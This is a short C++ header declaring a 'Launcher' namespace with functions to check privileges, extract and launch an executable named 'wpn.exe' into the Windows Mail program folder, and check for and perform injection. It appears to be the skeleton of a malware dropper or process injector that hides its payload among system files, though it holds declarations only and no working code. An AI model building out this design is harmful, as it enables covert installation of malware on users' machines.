#ifndef LAUNCHER_H
#define LAUNCHER_H

using namespace std;

const string NAME = "wpn";
const string FOLDER = "C://Program Files//Windows Mail";

const string EXTRACT_LOCATION = FOLDER + "//" + NAME + ".exe";

namespace Launcher {
	bool checkPrivileges();
	bool checkExtracted();
	void extract();
	bool checkRunning();
	void launch();
	bool checkInjected();
	void inject();
	void main();
}

#endif